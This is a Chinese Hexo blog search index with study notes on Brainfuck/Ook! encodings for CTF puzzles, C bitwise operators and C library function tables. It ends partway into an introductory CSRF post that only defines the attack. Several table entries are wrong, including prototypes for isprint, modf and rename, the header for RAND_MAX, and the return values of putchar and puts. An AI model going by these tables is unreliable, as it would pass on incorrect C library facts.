<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Brainfuck&amp;Ook!加密</title>
    <url>/2019/10/26/Brainfuck&amp;Ook%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Brainfuck-Ook-编码加密"><a href="#Brainfuck-Ook-编码加密" class="headerlink" title="Brainfuck/Ook!编码加密"></a>Brainfuck/Ook!编码加密</h1><hr>
<h2 id="Ook-加密"><a href="#Ook-加密" class="headerlink" title="Ook!加密"></a>Ook!加密</h2><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>OOK！只有三个不同的语法元素：<br>Ook。<br>OOK？<br>OOK！</p>
<a id="more"></a>

<p>它们组合成两个组，各种组合组合指定命令。因此，节目必须包含偶数个“Ook”。换行符被忽略</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>OOK。OOK？<br>将内存指针移动到下一个阵列单元格。</p>
<p>OOK？OOK。<br>将内存指针移动到上一个阵列单元格。</p>
<p>OOK。OOK。<br>增加内存指针指向的数组单元格。</p>
<p>OOK！OOK！<br>减少内存指针指向的数组单元格。</p>
<p>OOK。OOK！<br>从STDIN读取一个字符并将其ASCII值放入Memory指针指向的单元格中。</p>
<p>OOK！OOK。<br>打印ASCII值等于内存指针指向的单元格中的值的字符。</p>
<p>OOK！OOK？<br>移动到匹配的Ook之后的命令？OOK！如果存储器指针指向的单元格中的值为零。注意Ook！OOK？和欧克？OOK！命令嵌套像括号一样，匹配对的定义方式与括号相同。</p>
<p>OOK？OOK！<br>移动到匹配的Ook之后的命令！OOK？如果存储器指针指向的单元格中的值不为零。</p>
<hr>
<p>密文形式一（常见）：</p>
<pre><code>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </code></pre><p>密文形式二（不常见）：</p>
<pre><code>..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .....
..... ..... ..... ..... ..... ..... !.?.. ..... ..!?! !.?!! !!!!! !?.?!
.?!!! !!... ..... ..... ..!.! !!!!! !!!!! !!!!! !!!.? ..... ..!?! !.?..
....? .?!.? ..... .!.!! !!!.! !!!!! !!!!! !!!!! !.?.. ..... ..... .....
!?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. ?.... ..... ..... .....
!?!!. ?.... ..... ..... ....? .?!.? ..... .!.!! !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!! !!!!! !!!!!
!!!!! !!.?. ..... ..... !?!!. ?.... ..... .?.?! .?... ..... ..... .....
..!.? ..... ....! ?!!.? ..... ...?. ?!.?. .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! .?.</code></pre><hr>
<h2 id="Brainfuck加密"><a href="#Brainfuck加密" class="headerlink" title="Brainfuck加密"></a>Brainfuck加密</h2><h3 id="语法规则-1"><a href="#语法规则-1" class="headerlink" title="语法规则"></a>语法规则</h3><p>Brainfuck编程语言由八个命令组成，每个命令都表示为一个字符。</p>
<p>递增指针：&gt;</p>
<p>减少指针：&lt;</p>
<p>递增指针处的字节：+</p>
<p>减少指针处的字节：-</p>
<p>输出指针处的字节：。</p>
<p>输入一个字节并将其存储在指针的字节中：，</p>
<p>如果指针处的字节为零，则跳过匹配]：[</p>
<p>向后跳转到匹配[除非指针处的字节为零：]</p>
<hr>
<p><font color="green">Brainfuck命令的语义也可以用C语言简洁地表达</font>，如下所示（假设p先前已被定义为char *）：</p>
<ul>
<li>++ p : &gt;</li>
</ul>
<ul>
<li><p>–p  : &lt;</p>
</li>
<li><p>++ * p : +</p>
</li>
<li><p>– * p : -</p>
</li>
<li><p>putchar（* p）: 。</p>
</li>
<li><p>*p = getchar（）: ，</p>
</li>
<li><p>while（* p）{ : [</p>
</li>
<li><p>} : ]</p>
</li>
</ul>
<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;
]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----
-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-
&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++
+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++
++.&lt;</code></pre><p><strong>这两种加密方式的解密网站是同一个：</strong><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
]]></content>
      <categories>
        <category>密码学</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>加密解密</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言位运算符学习</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h1><p>[Toc]</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><ul>
<li>位运算是指按二进制进行的运算。</li>
<li>C语言提供了6个位操作运算符。这些运算符只能用于整型操作数，即只能用于带符号或无符号的char,short,int与long类型。</li>
</ul>
<a id="more"></a>

<p>======================================</p>
<h2 id="C语言提供的位运算符列表"><a href="#C语言提供的位运算符列表" class="headerlink" title="C语言提供的位运算符列表"></a><strong>C语言提供的位运算符列表</strong></h2><table>
<thead>
<tr>
<th>运算符</th>
<th>含义</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>按位与</td>
<td>如果两个相应的二进制位都为1，则该位的结果值为1，否则为0</td>
</tr>
<tr>
<td>l</td>
<td>按位或</td>
<td>两个相应的二进制位中只要有一个为1，该位的结果值为1</td>
</tr>
<tr>
<td>^</td>
<td>按位异或</td>
<td>若参加运算的两个二进制位值相同则为0，否则为1</td>
</tr>
<tr>
<td>~</td>
<td>取反</td>
<td>~是一元运算符，用来对一个二进制数按位取反，即将0变1，将1变0</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移</td>
<td>用来将一个数的各二进制位全部左移N位，右补0</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移</td>
<td>将一个数的各二进制位右移N位，移到右端的低位被舍弃，对于无符号数，高位补0</td>
</tr>
</tbody></table>
<hr>
<h2 id="按位与运算符"><a href="#按位与运算符" class="headerlink" title="按位与运算符"></a><strong>按位与运算符</strong></h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul>
<li>按位与是指：参加运算的两个数据，按二进制位进行“与”运算。如果两个相应的二进制位都为１，则该位的结果值为1；否则为0。</li>
<li>按位与其实与逻辑上“与”的运算规则一致。逻辑上的“与”，要求运算数全真，结果才为真。若，A=true,B=true,则A∩B=true </li>
<li>例如：3&amp;5 3的二进制编码是11(2)。（为了区分十进制和其他进制，凡是非十进制的数据均在数据后面加上括号，括号中注明其进制，二进制则标记为2）内存储存数据的基本单位是字节（Byte），一个字节由8个位（bit)所组成。位是用以描述电脑数据量的最小单位。二进制系统中，每个0或1就是一个位。将11（2）补足成一个字节，则是00000011（2）。5的二进制编码是101（2），将其补足成一个字节，则是00000101（2）</li>
</ul>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>1）清零</p>
<p>若想对一个存储单元清零，即使其全部二进制位为0，只要找一个二进制数</p>
<blockquote>
<p>原来的数中为1的位，新数中相应位为0。然后使二者进行&amp;运算，即可达到清零目的</p>
</blockquote>
<p>2）取一个数中某些指定位</p>
<p>若有一个整数a(2byte),想要取其中的低字节，只需要将a与8个1按位与即可</p>
<p>3）保留指定位：</p>
<p>与一个数进行“按位与”运算，此数在该位取1.</p>
<hr>
<hr>
<h2 id="按位或运算符"><a href="#按位或运算符" class="headerlink" title="按位或运算符"></a><strong>按位或运算符</strong></h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><ul>
<li>两个相应的二进制位中只要有一个为1，该位的结果值为1。</li>
</ul>
<hr>
<hr>
<h2 id="异或运算符"><a href="#异或运算符" class="headerlink" title="异或运算符"></a><strong>异或运算符</strong></h2><ul>
<li>1.使特定位翻转</li>
<li>2.保留原值（与0相异或）</li>
<li>3.交换两个值不用临时变量</li>
</ul>
<hr>
<hr>
<h2 id="取反运算符"><a href="#取反运算符" class="headerlink" title="取反运算符"></a><strong>取反运算符</strong></h2><ul>
<li>用于求整数的二进制反码，即分别将操作数各二进制位上的1变为0，0变为1。</li>
</ul>
<hr>
<hr>
<h2 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符"></a><strong>左移运算符</strong></h2><ul>
<li>左移运算符是用来将一个数的各二进制位左移若干位，移动的位数由右操作数指定（右操作数必须是非负值），其右边空出的位用0填补，高位左移溢出则舍弃该高位。</li>
</ul>
<hr>
<hr>
<h2 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符"></a><strong>右移运算符</strong></h2><ul>
<li>右移运算符是用来将一个数的各二进制位右移若干位，移动的位数由右操作数指定（右操作数必须是非负<br>值），移到右端的低位被舍弃，</li>
<li>对于无符号数，高位补0。</li>
<li>对于有符号数，某些机器将对左边空出的部分<br>用符号位填补（即“算术移位”），而另一些机器则对左边空出的部分用0填补（即“逻辑移位”）。</li>
<li>注意：对无符号数,右移时左边高位移入0；对于有符号的值,如果原来符号位为0(该数为正),则左边也是移入0。如果符号位原来为1(即负数),则左边移入0还是1,要取决于所用的计算机系统。有的系统移入0,有的系统移入1。移入0的称为“逻辑移位”,即简单移位；移入1的称为“算术移位”。</li>
</ul>
<hr>
<hr>
<h2 id="位运算赋值运算符"><a href="#位运算赋值运算符" class="headerlink" title="位运算赋值运算符"></a><strong>位运算赋值运算符</strong></h2><ul>
<li>位运算符与赋值运算符可以组成复合赋值运算符。</li>
</ul>
<blockquote>
<p>例如: &amp;=, |=, &gt;&gt;=, &lt;&lt;=, ∧=</p>
</blockquote>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言库函数学习</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%BA%93%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="C语言库函数"><a href="#C语言库函数" class="headerlink" title="C语言库函数"></a>C语言库函数</h1><p>[Toc]</p>
<h2 id="1-数学函数"><a href="#1-数学函数" class="headerlink" title="1.数学函数"></a><strong>1.数学函数</strong></h2><ul>
<li>使用数学函数时，应在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;math.h></span> </span></code></pre>
</li>
</ul>
<a id="more"></a>

<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>acos</td>
<td>double acos(double x)</td>
<td>计算arccos x的值，其中-1&lt;=x&lt;=1</td>
<td>计算结果</td>
</tr>
<tr>
<td>asin</td>
<td>double asin(double x)</td>
<td>计算arcsin x的值，其中-1&lt;=x&lt;=1</td>
<td>计算结果</td>
</tr>
<tr>
<td>atan</td>
<td>double atan(double x)</td>
<td>计算arctan x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>atan2</td>
<td>double atan2(double x,double y)</td>
<td>计算arctan x/y的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>cos</td>
<td>double cos(double x)</td>
<td>计算cos x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>cosh</td>
<td>double cosh(double x)</td>
<td>计算x的双曲余弦cosh x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>exp</td>
<td>double exp(double x)</td>
<td>求e^x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>fabs</td>
<td>double fabs(double x)</td>
<td>求x的绝对值</td>
<td>计算结果</td>
</tr>
<tr>
<td>floor</td>
<td>double floor(double x)</td>
<td>求出不大于x的最大整数</td>
<td>该整数的双精度实数</td>
</tr>
<tr>
<td>fmod</td>
<td>double fmod(double x,double y);</td>
<td>求整除x/y的余数</td>
<td>返回余数的双精度实数</td>
</tr>
<tr>
<td>frexp</td>
<td>double frexp(double val,int *eptr)</td>
<td>把双精度数val分解成数字部分(尾数)和以2为底的指数，即val=x * 2^n,n存放在eptr指向的变量中</td>
<td>数字部分x 0.5 &lt;= x &lt; 1</td>
</tr>
<tr>
<td>log</td>
<td>double log(double x)</td>
<td>求ln x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>log10</td>
<td>double log10(double x)</td>
<td>求log10x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>modf</td>
<td>double mof(double val,int * iptr)</td>
<td>把双精度数val分解成数字部分和小数部分，把整数部分存放在ptr指向的变量中</td>
<td>val的小数部分</td>
</tr>
<tr>
<td>pow</td>
<td>double pow(double x,double y)</td>
<td>求x^y的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>sin</td>
<td>double sin(double x)</td>
<td>求sin x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>sinh</td>
<td>double sinh(double x)</td>
<td>计算x的双曲正弦函数sinh x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>sqrt</td>
<td>double sqrt(double x)</td>
<td>计算，其中x&gt;=0</td>
<td>计算结果</td>
</tr>
<tr>
<td>tan</td>
<td>double tan(double x)</td>
<td>计算tan x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>tanh</td>
<td>double tanh(double x)</td>
<td>计算tanh x的值，其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
</tbody></table>
<hr>
<h2 id="2-字符函数"><a href="#2-字符函数" class="headerlink" title="2.字符函数"></a><strong>2.字符函数</strong></h2><ul>
<li>在使用字符函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>isalnum</td>
<td>int isalnum(int ch)</td>
<td>检查ch是否字母或数字</td>
<td>是则返回1，否则返回0</td>
</tr>
<tr>
<td>isalpha</td>
<td>int isalpha(int ch)</td>
<td>检查ch是否为字母</td>
<td>是字母返回1，否则返回0</td>
</tr>
<tr>
<td>iscntrl</td>
<td>int iscntrl(int ch)</td>
<td>检查ch是否控制字符（其ASCII码在0和0xLF之间)</td>
<td>是控制字符返回1，否则返回0</td>
</tr>
<tr>
<td>isdigit</td>
<td>int isdigit(int ch)</td>
<td>检查ch是否为数字</td>
<td>是数字返回1，否则返回0</td>
</tr>
<tr>
<td>isgraph</td>
<td>int isgraph(int ch)</td>
<td>检查ch是否可打印字符（其ASCII码在0x21和0x7e之间），不包括空格</td>
<td>可打印字符返回1，否则返回0</td>
</tr>
<tr>
<td>islower</td>
<td>int islower(int ch)</td>
<td>检查ch是否是小写字母(a~z)</td>
<td>是小写字母返回1，否则返回0</td>
</tr>
<tr>
<td>isprint</td>
<td>int print(int ch)</td>
<td>检查ch是否是可打印字符（其ASCII码在0x21和0x7e之间),不包括空格</td>
<td>可打印字符返回1，否则返回0</td>
</tr>
<tr>
<td>ispunct</td>
<td>int ispunct(int ch)</td>
<td>检查ch是否是标点字符（不包括空格）即除字母、数字和空格以外的所有可打印字符</td>
<td>是标点返回1，否则返回0</td>
</tr>
<tr>
<td>isspace</td>
<td>int isspace(int ch)</td>
<td>检查ch是否空格、制表符或换行符</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>isupper</td>
<td>int isupper(int ch)</td>
<td>检查ch是否大写字母(A~Z)</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>isxdigit</td>
<td>int isxdigit(int ch)</td>
<td>检查ch是否一个16进制数字(即0<del>9，或A</del>F,a~f)</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>tolower</td>
<td>int tolower(int ch)</td>
<td>将ch字符转换为小写字母</td>
<td>返回ch对应的小写字母</td>
</tr>
<tr>
<td>toupper</td>
<td>int toupper(int ch)</td>
<td>将ch字符转换为大写字母</td>
<td>返回ch对应的大写字母</td>
</tr>
</tbody></table>
</li>
</ul>
<hr>
<h2 id="3-字符串函数"><a href="#3-字符串函数" class="headerlink" title="3.字符串函数"></a><strong>3.字符串函数</strong></h2><ul>
<li>在使用字符串函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></code></pre>
<img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538569387148&di=fa4604d28b80f7d5b8031101d952c7c7&imgtype=0&src=http%3A%2F%2Fwww.68idc.cn%2Fhelp%2Fuploads%2Fallimg%2F150116%2F151FMW7_0.jpg" alt></li>
</ul>
<hr>
<h2 id="4-输入输出函数"><a href="#4-输入输出函数" class="headerlink" title="4.输入输出函数"></a><strong>4.输入输出函数</strong></h2><ul>
<li>在使用输入输出函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></code></pre>
</li>
</ul>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>clearerr</td>
<td>void clearerr(FILE *fp)</td>
<td>清除文件指针错误提示器</td>
<td>无</td>
</tr>
<tr>
<td>close</td>
<td>int close(int fp)</td>
<td>关闭文件（非ANSI标准)</td>
<td>关闭成功返回0，不成功返回-1</td>
</tr>
<tr>
<td>creat</td>
<td>int creat(char*filename,int mode)</td>
<td>以mode所指定的方式建立文件（非ANSI标准）</td>
<td>成功返回正数，否则返回-1</td>
</tr>
<tr>
<td>eof</td>
<td>int eof（int fp)</td>
<td>判断fp所指的文件是否结束</td>
<td>文件结束返回1，否则返回0</td>
</tr>
<tr>
<td>fclose</td>
<td>int fclose（FILE * fp)</td>
<td>关闭fp所指的文件，释放文件缓冲区</td>
<td>关闭成功返回0，不成功返回非0</td>
</tr>
<tr>
<td>feof</td>
<td>int feof(FILE * fp)</td>
<td>检查文件是否结束</td>
<td>结束返回非0，否则返回0</td>
</tr>
<tr>
<td>ferror</td>
<td>int ferror(FILE * fp)</td>
<td>测试fp所指文件是否错误</td>
<td>无错返回0，否则返沪非0</td>
</tr>
<tr>
<td>fflush</td>
<td>int fflush(FILE * fp)</td>
<td>将fp所指的文件的全部控制信息和数据存盘</td>
<td>存盘正确返回0，否则返回非0</td>
</tr>
<tr>
<td>fgets</td>
<td>char *fgets(char *buf,int n,FILE *fp)</td>
<td>从fp所指的文件读取一个长度为(n-1)的字符串，存入起始地址为buf的空间</td>
<td>返回地址buf。若遇文件结束或出错则返回E0F</td>
</tr>
<tr>
<td>fopen</td>
<td>FILE *fopen(char *filename, char *mode)</td>
<td>以mode指定的方式打开名为filename的文件</td>
<td>成功，则返回一个文件指针，否则返回0</td>
</tr>
<tr>
<td>fprintf</td>
<td>int fprintf(FILE * fp, char *format,args,…)</td>
<td>把args的值以format指定的格式输出到fp所指的文件中</td>
<td>实际输出的字符数</td>
</tr>
<tr>
<td>fputc</td>
<td>int putc(char ch,FILE * fp)</td>
<td>将字符ch输出到fp所指的文件中</td>
<td>成功返回该字符，出错返回E0F</td>
</tr>
<tr>
<td>fputs</td>
<td>int fputs(char str,FILE * fp)</td>
<td>将str指定的字符串输出到fp所指的文件中</td>
<td>成功则返回0，出错则返回E0F</td>
</tr>
<tr>
<td>fread</td>
<td>int fread(char *pt, unsigned size,unsigned n,FILE * fp)</td>
<td>从fp所定文件中读取长度为size的n个数据项，存放到pt所指向的内存区</td>
<td>返回所读的数据项个数，若文件结束或出错返回0</td>
</tr>
<tr>
<td>fscanf</td>
<td>int fscanf(FILE * fp,char *format,args,…)</td>
<td>从fp指定的文件中按给定的format格式将读入的数据送到args所指向的内存变量中(args是指针)</td>
<td>输入的数据个数</td>
</tr>
<tr>
<td>fseek</td>
<td>int fseek(FILE * fp,long offset,int base)</td>
<td>将fp指定的文件的位置指针移到base所指出的位置为基准，以offset为位移量的位置</td>
<td>返回当前位置，否则返回-1</td>
</tr>
<tr>
<td>ftell</td>
<td>long ftell(FILE * fp)</td>
<td>返回fp所指定的文件中的读写位置</td>
<td>返回文件中的读写位置，否则返回0</td>
</tr>
<tr>
<td>fwrite</td>
<td>int fwrite(char *ptr,unsigned size,unsigned n,FILE * fp)</td>
<td>把ptr所指向的的n * size个字节输出到fp所指向的文件中</td>
<td>写到fp文件中的数据项的个数</td>
</tr>
<tr>
<td>getc</td>
<td>int getc(FILE * fp)</td>
<td>从fp所指向的文件中的独处下一个字符</td>
<td>返回读出的字符，若文件出错或结束返回E0F</td>
</tr>
<tr>
<td>getchar</td>
<td>int getchar()</td>
<td>从标准输入设备中读取下一个字符</td>
<td>返回字符，若文件出错或结束返回-1</td>
</tr>
<tr>
<td>gets</td>
<td>char *gets(char *str)</td>
<td>从标准输入设备中读取字符串存入str指向的数组</td>
<td>成功返回str，否则返回NULL</td>
</tr>
<tr>
<td>open</td>
<td>int open(char *filename, int mode)</td>
<td>以mode指定的方式打开已存在的名为filename的文件（非ANSI标准）</td>
<td>返回文件号（正数），如打开失败返回-1</td>
</tr>
<tr>
<td>printf</td>
<td>int printf(char *format,args,…)</td>
<td>在format指定的字符串的控制下，将输出列表args的指输出到标准设备</td>
<td>输出字符的个数。若出错返回负数</td>
</tr>
<tr>
<td>prtc</td>
<td>int prtc(int ch,FILE *fp)</td>
<td>把一个字符ch输入到fp所指的文件中</td>
<td>输出字符ch，若出错返回E0F</td>
</tr>
<tr>
<td>putchar</td>
<td>int putchar(char ch)</td>
<td>把字符ch输出到fp标准输出设备</td>
<td>返回换行符，若失败返回E0F</td>
</tr>
<tr>
<td>puts</td>
<td>int puts(char *str)</td>
<td>把str指向的字符串输出到标准输入设备，将”/0”转换为回车行</td>
<td>返回换行符，若失败返回E0F</td>
</tr>
<tr>
<td>putw</td>
<td>int putw(int w,FILE *fp)</td>
<td>将一个整数i（即一个字）写到fp所指文件中（非ANSI标准）</td>
<td>返回读出的字符，若文件出错或结束返回E0F</td>
</tr>
<tr>
<td>read</td>
<td>int read(int fd,char *buf,unsigned count)</td>
<td>从文件号fp所指定的文件中读count个字节到buf知识的缓冲区（非ANSI标准）</td>
<td>返回真正读出的字节个数，如文件结束返回0，出错返回-1</td>
</tr>
<tr>
<td>remove</td>
<td>int remove(char *fname)</td>
<td>删除以fname为文件名的文件</td>
<td>成功返回0，出错返回-1</td>
</tr>
<tr>
<td>rename</td>
<td>int remove(char *oname,char *nname)</td>
<td>把oname所指的文件名改为y由nname所指的文件名</td>
<td>成功返回0，出错返回-1</td>
</tr>
<tr>
<td>rewind</td>
<td>void rewind（FILE *fp)</td>
<td>将fp指定的文件指针置于文件头，并清除文件结束标志和错误标志</td>
<td>无</td>
</tr>
<tr>
<td>scanf</td>
<td>int scanf(char *format,args,…)</td>
<td>从标准输入设备按format指示的格式字符串规定的格式，输入数据给args所指示的单元，args为指针</td>
<td>读入并附给args数据个数。如文件结束返回E0F，若出错返回0</td>
</tr>
<tr>
<td>write</td>
<td>int write(int fd,char *buf,unsigned count)</td>
<td>从buf指示的缓冲区输出count个字符到fd所指的文件中（非ANSI标准）</td>
<td>返回实际输入的字节数，如出错返回-1</td>
</tr>
</tbody></table>
<hr>
<h2 id="5-动态储存分配函数"><a href="#5-动态储存分配函数" class="headerlink" title="5.动态储存分配函数"></a><strong>5.动态储存分配函数</strong></h2><ul>
<li>在使用动态储存分配函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdib<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>calloc</td>
<td>void *calloc(unsigned n,unsigned size)</td>
<td>分配n个数据项的内存连续空间，每个数据项的大小为size</td>
<td>分配内存单元的起始地址。如不成功返回0</td>
</tr>
<tr>
<td>free</td>
<td>void free(void *p)</td>
<td>释放p所指的内存区</td>
<td>无</td>
</tr>
<tr>
<td>malloc</td>
<td>void *malloc(unsigned size)</td>
<td>分配size字节的内存区</td>
<td>所分配的内存区地址如内存不够，返回0</td>
</tr>
<tr>
<td>realloc</td>
<td>void *realloc(void *p,unsigned size)</td>
<td>将p所指的以分配的内存区的大小改为size。size可比原来的空间大或小</td>
<td>返回指向该内存区的指针。若重新分配失败，则返回NULL</td>
</tr>
</tbody></table>
</li>
</ul>
<hr>
<h2 id="6-其他函数"><a href="#6-其他函数" class="headerlink" title="6.其他函数"></a><strong>6.其他函数</strong></h2><ul>
<li>在使用这些函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>abs</td>
<td>int abs(int num)</td>
<td>计算整数num的绝对值</td>
<td>返回计算结果</td>
</tr>
<tr>
<td>atof</td>
<td>double atof(char *str)</td>
<td>将str指向的字符串转换为一个double型的指</td>
<td>返回双精度计算结果</td>
</tr>
<tr>
<td>atoi</td>
<td>int atoi(char *str)</td>
<td>将str指向的字符串转换为int型的值</td>
<td>返回转换结果</td>
</tr>
<tr>
<td>atol</td>
<td>long atol(cahr *str)</td>
<td>将str指向的字符串转换为一个long型的值</td>
<td>返回转换结果</td>
</tr>
<tr>
<td>exit</td>
<td>void exit(int status)</td>
<td>中止程序运行。将status的值返回调用的过程</td>
<td>无</td>
</tr>
<tr>
<td>itoa</td>
<td>char *itoa(int n,char *str,int radix)</td>
<td>将整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串中</td>
<td>返回一个指向str的指针</td>
</tr>
<tr>
<td>labs</td>
<td>long labs（long num）</td>
<td>计算long型的整数num的绝对值</td>
<td>返回计算结果</td>
</tr>
<tr>
<td>ltoa</td>
<td>char *ltoa(long n,char *str,int radix)</td>
<td>将长整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串</td>
<td>返回一个指向str的指针</td>
</tr>
<tr>
<td>rand</td>
<td>int rand()</td>
<td>产生0到RAND_MAX之间的伪随机数。RAND_MAX在头文件中定义(头文件为time.h)</td>
<td>返回一个伪随机（整）数</td>
</tr>
<tr>
<td>random</td>
<td>int random（int num）</td>
<td>产生0到num之间的随机数(头文件为time.h)</td>
<td>返回一个随机（整）数</td>
</tr>
<tr>
<td>randomize</td>
<td>void randomize()</td>
<td>初始化随机函数，使用时包括头文件time.h</td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2019/10/26/CSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="CSRF学习"><a href="#CSRF学习" class="headerlink" title="CSRF学习"></a>CSRF学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>CSRF（Cross-site request forgery）跨站请求伪造，通过<font color="red">伪装成受信任用户</font>的请求来利用受信任的网站。</li>
</ul>
<a id="more"></a>

<blockquote>
<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
</blockquote>
<hr>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-GET型"><a href="#1-GET型" class="headerlink" title="1.GET型"></a>1.GET型</h3><ul>
<li>通过修改get请求的参数，来达到攻击的目的</li>
</ul>
<blockquote>
